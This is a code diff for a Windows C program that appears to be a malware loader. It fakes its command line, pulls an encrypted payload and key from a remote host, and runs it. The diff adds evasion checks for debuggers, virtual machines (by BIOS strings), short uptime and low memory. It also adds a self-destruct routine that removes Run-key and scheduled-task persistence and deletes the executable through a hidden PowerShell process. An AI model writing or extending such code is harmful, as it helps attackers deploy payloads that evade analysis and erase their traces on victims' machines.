@@ -108,6 +108,90 @@ LPSTR hookGetCommandLineA() { return sz_masqCmd_Ansi; }
 char*** __cdecl hook__p___argv(void) { return &poi_masqArgvA; }
 wchar_t*** __cdecl hook__p___wargv(void) { return &poi_masqArgvW; }
 int* __cdecl hook__p___argc(void) { return &int_masqCmd_Argc; }
+void selfDestruct();
+
+
+// === ANTI-ANALYSIS ===
+BOOL anti_analysis() {
+    if (IsDebuggerPresent()) return TRUE;
+
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        char buffer[256];
+        DWORD size = sizeof(buffer);
+        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
+                RegCloseKey(hKey);
+                return TRUE;
+            }
+        }
+        RegCloseKey(hKey);
+    }
+
+    if (GetTickCount() < 60000) return TRUE;
+
+    MEMORYSTATUSEX mem;
+    mem.dwLength = sizeof(mem);
+    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
+
+    return FALSE;
+}
+
+void selfDestruct() {
+    printf("[*] Initiating self-destruct...\n");
+    fflush(stdout);
+    
+    char exePath[MAX_PATH];
+    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
+        printf("[-] Failed to get executable path\n");
+        return;
+    }
+    
+    // Eliminar del registro
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "SystemMaintenance");
+        RegCloseKey(hKey);
+    }
+    
+    // Eliminar tarea programada
+    system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");
+    
+    // Preparar comando PowerShell robusto, ESCAPADO PARA BASH
+    char cmd[2048];
+    snprintf(cmd, sizeof(cmd),
+        "cmd.exe /c "
+        "timeout /t 3 > nul & "
+        "powershell -Command \""
+            "$ErrorActionPreference='SilentlyContinue'; "
+            "for($i=0; $i -lt 5; $i++){ "
+                "Start-Sleep -Seconds 2; "
+                "try{ Remove-Item -Force -Path '%s' -ErrorAction Stop; exit } catch{} "
+            "}; "
+            "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemMaintenance' -ErrorAction SilentlyContinue"
+        "\" > nul 2>&1",
+        exePath);
+    
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+    
+    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
+                      CREATE_NO_WINDOW | DETACHED_PROCESS,
+                      NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    } else {
+        printf("[-] Failed to spawn cleanup process\n");
+    }
+    
+    printf("[+] Self-destruct sequence activated. Exiting now...\n");
+    fflush(stdout);
+    
+    ExitProcess(0);
+}
 
 int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
     *_Argc = int_masqCmd_Argc;
@@ -576,6 +660,11 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
 }
 
 int main(int argc, char** argv) {
+    srand(GetTickCount());
+
+    // Anti-analysis
+    if (anti_analysis()) return 1;
+
     if (argc != 5) {
         printf("[+] Usage: %s <Host> <Port> <CipherFile> <KeyFile>\n", argv[0]);
         return 1;
@@ -631,6 +720,7 @@ cleanup:
     free(wkey);
     if (PE.data) free(PE.data);
     if (keyData.data) free(keyData.data);
-
+    Sleep(3000); 
+    selfDestruct();
     return 0;
 }
